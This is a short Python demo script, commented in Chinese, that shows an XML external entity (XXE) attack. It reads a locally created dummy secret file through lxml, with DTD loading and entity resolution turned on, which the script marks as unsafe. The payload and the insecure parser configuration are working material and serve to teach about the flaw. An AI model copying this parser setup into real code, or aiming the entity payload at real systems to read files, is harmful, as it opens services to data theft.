# xxe_vuln_demo.py  —  漏洞演示（请在沙箱/本机自测）
from lxml import etree
from pathlib import Path

# 1) 准备一个“机密”文件，模拟被读取的数据
secret_path = Path("secret.txt").resolve()
secret_path.write_text("TOP-SECRET: 你不应该看到这段文字，除非被XXE攻击!\n", encoding="utf-8")

# 2) 构造带 XXE 的 XML，实体指向本地文件（file:// URI）
xml_payload = f"""\
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ELEMENT root ANY >
  <!ENTITY xxe SYSTEM "{secret_path.as_uri()}">
]>
<root>&xxe;</root>
"""

# 3) 关键点：启用 DTD + 实体展开（易踩坑配置）
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)  # ⚠️ 不安全

doc = etree.fromstring(xml_payload.encode("utf-8"), parser=parser)
print("Parsed text:", doc.text)  # 通常会打印出 secret.txt 的内容
